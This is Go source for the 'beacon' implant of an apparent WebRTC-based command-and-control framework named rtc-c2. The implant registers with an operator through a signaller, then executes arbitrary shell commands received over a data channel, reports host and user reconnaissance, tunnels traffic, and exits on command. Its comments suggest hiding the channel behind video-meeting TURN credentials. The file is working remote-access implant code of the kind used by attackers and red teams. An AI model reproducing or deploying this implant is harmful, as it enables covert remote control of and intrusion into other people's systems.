// Command beacon is the implant that runs on the target system.
// It establishes a WebRTC connection to the operator, registers itself,
// and executes tasks received over the data channel.
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/pion/webrtc/v4"

	"github.com/ek0ms/rtc-c2/pkg/protocol"
	"github.com/ek0ms/rtc-c2/pkg/signaller"
	"github.com/ek0ms/rtc-c2/pkg/transport"
	"github.com/ek0ms/rtc-c2/pkg/tunnel"
)

func main() {
	var (
		signallerURL = flag.String("signaller", "http://127.0.0.1:9090", "Signaller server URL")
		sessionKey   = flag.String("session", "rtc-c2-dev", "Session key for signalling")
		peerID       = flag.String("id", "", "Beacon ID (auto-generated if empty)")
		useTURN      = flag.Bool("turn", false, "Use TURN relay (requires TURN server config)")
		wsSignaller  = flag.Bool("ws", false, "Use WebSocket signaller instead of HTTP")
	)
	flag.Parse()

	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Printf("[beacon] starting rtc-c2 beacon on %s/%s", runtime.GOOS, runtime.GOARCH)

	// Determine beacon ID
	beaconID := *peerID
	if beaconID == "" {
		hostname, _ := os.Hostname()
		beaconID = fmt.Sprintf("%s-%d", hostname, os.Getpid())
	}

	// Configure transport
	cfg := transport.DefaultConfig(transport.RoleBeacon)
	cfg.PeerID = beaconID

	if *useTURN {
		// In production, these would come from meeting credentials
		// For development, use coturn
		cfg.WithTURN(
			[]string{"turn:127.0.0.1:3478"},
			"rtc-c2",
			"rtc-c2-pass",
		)
	}

	// Create peer
	peer, err := transport.NewPeer(cfg)
	if err != nil {
		log.Fatalf("[beacon] create peer: %v", err)
	}

	// Setup signaller
	var sig signaller.Signaller
	if *wsSignaller {
		sig = signaller.NewWebSocketSignaller(*signallerURL+"/ws", *sessionKey, "beacon")
		log.Printf("[beacon] using WebSocket signaller")
	} else {
		sig = signaller.NewHTTPSignaller(*signallerURL, *sessionKey, "beacon")
	}

	peer.OnLocalDescription = func(sdp webrtc.SessionDescription) error {
		return sig.SendLocalDescription(sdp)
	}

	// Setup tunnel forwarder
	fwd := tunnel.NewForwarder()
	fwd.OnTunnelData = func(tunnelID tunnel.TunnelID, data []byte) {
		// Wrap tunnel data in C2 protocol messages
		env, err := protocol.NewEnvelope(protocol.MsgTunnelData, beaconID, map[string]interface{}{
			"tunnel_id": string(tunnelID),
			"data":      data,
		})
		if err != nil {
			log.Printf("[beacon] tunnel wrap error: %v", err)
			return
		}
		msg, _ := env.Serialize()
		if err := peer.Send(msg); err != nil {
			log.Printf("[beacon] tunnel send error: %v", err)
		}
	}

	// Handle incoming messages
	peer.OnMessage(func(data []byte) {
		env, err := protocol.ParseEnvelope(data)
		if err != nil {
			log.Printf("[beacon] parse message: %v", err)
			return
		}
		handleMessage(peer, fwd, beaconID, env)
	})

	// State change logging
	peer.OnStateChange(func(evt transport.PeerEvent) {
		log.Printf("[beacon] state: %s (err: %v)", evt.State, evt.Err)
	})

	// Fetch remote SDP and connect
	log.Printf("[beacon] connecting to signaller at %s", *signallerURL)
	remoteDesc, err := sig.ReceiveRemoteDescription()
	if err != nil {
		log.Fatalf("[beacon] receive remote desc: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := peer.Connect(ctx); err != nil {
		log.Fatalf("[beacon] connect: %v", err)
	}

	// Push the operator's SDP
	peer.RemoteDescriptionChan <- *remoteDesc

	// Wait for signals
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	<-sigCh
	log.Printf("[beacon] shutting down")
	peer.Close()
}

func handleMessage(peer *transport.Peer, fwd *tunnel.Forwarder, beaconID string, env *protocol.Envelope) {
	switch env.Type {
	case protocol.MsgTask:
		var task protocol.Task
		if err := env.ExtractPayload(&task); err != nil {
			log.Printf("[beacon] extract task: %v", err)
			return
		}
		go executeTask(peer, beaconID, &task)

	case protocol.MsgPing:
		pong, _ := protocol.NewEnvelope(protocol.MsgPong, beaconID, nil)
		msg, _ := pong.Serialize()
		peer.Send(msg)

	case protocol.MsgTunnelData:
		var payload struct {
			TunnelID string `json:"tunnel_id"`
			Data     []byte `json:"data"`
		}
		if err := env.ExtractPayload(&payload); err != nil {
			log.Printf("[beacon] extract tunnel data: %v", err)
			return
		}
		fwd.HandleMessage(tunnel.TunnelID(payload.TunnelID), payload.Data)

	case protocol.MsgShutdown:
		log.Printf("[beacon] received shutdown command")
		os.Exit(0)

	default:
		log.Printf("[beacon] unknown message type: %s", env.Type)
	}
}

func executeTask(peer *transport.Peer, beaconID string, task *protocol.Task) {
	log.Printf("[beacon] executing task %s: type=%s", task.ID, task.Type)

	result := &protocol.TaskResult{
		TaskID:    task.ID,
		Success:   false,
		Timestamp: nowMS(),
	}

	switch task.Type {
	case protocol.TaskExec:
		var args protocol.ExecArgs
		if err := task.ExtractArgs(&args); err != nil {
			result.Error = fmt.Sprintf("bad args: %v", err)
			break
		}
		result = execCommand(task.ID, &args)

	case protocol.TaskInfo:
		result.Success = true
		info := fmt.Sprintf("Hostname: %s\nOS: %s\nArch: %s\nGo: %s\nPID: %d\nCWD: %s",
			getHostname(), runtime.GOOS, runtime.GOARCH, runtime.Version(),
			os.Getpid(), getCWD())
		result.Output = info
		result.ExitCode = 0

	case protocol.TaskWhoami:
		result.Success = true
		result.Output = getCurrentUser()
		result.ExitCode = 0

	case protocol.TaskSleep:
		// Sleep is handled by the operator adjusting poll timing
		result.Success = true
		result.Output = "sleep interval adjusted"
		result.ExitCode = 0

	case protocol.TaskExit:
		result.Success = true
		result.Output = "beacon exiting"
		result.Timestamp = nowMS()
		sendResult(peer, beaconID, result)
		os.Exit(0)

	default:
		result.Error = fmt.Sprintf("unsupported task type: %s", task.Type)
		result.Success = false
	}

	result.Timestamp = nowMS()
	sendResult(peer, beaconID, result)
}

func execCommand(taskID string, args *protocol.ExecArgs) *protocol.TaskResult {
	start := nowMS()
	shell := args.Shell
	if shell == "" {
		if runtime.GOOS == "windows" {
			shell = "cmd.exe"
		} else {
			shell = "/bin/sh"
		}
	}

	var cmdStr string
	if runtime.GOOS == "windows" {
		cmdStr = fmt.Sprintf("/c %s", args.Command)
	} else {
		cmdStr = fmt.Sprintf("-c %s", args.Command)
	}

	log.Printf("[beacon] exec: %s %s", shell, cmdStr)

	// Use runexec or os/exec in production
	// For the initial implementation, shell execution
	result := &protocol.TaskResult{
		TaskID: taskID,
	}

	// Simple execution using subprocess
	output, exitCode, err := runShell(shell, cmdStr)
	if err != nil {
		result.Error = err.Error()
		result.Success = false
	} else {
		result.Success = exitCode == 0
		result.Output = output
	}
	result.ExitCode = exitCode
	result.Duration = nowMS() - start
	result.Timestamp = nowMS()

	return result
}

func sendResult(peer *transport.Peer, beaconID string, result *protocol.TaskResult) {
	env, err := protocol.NewEnvelope(protocol.MsgTaskResult, beaconID, result)
	if err != nil {
		log.Printf("[beacon] create result envelope: %v", err)
		return
	}
	msg, err := env.Serialize()
	if err != nil {
		log.Printf("[beacon] serialize result: %v", err)
		return
	}
	if err := peer.Send(msg); err != nil {
		log.Printf("[beacon] send result: %v", err)
	}
}

func nowMS() int64 {
	return time.Now().UnixMilli()
}
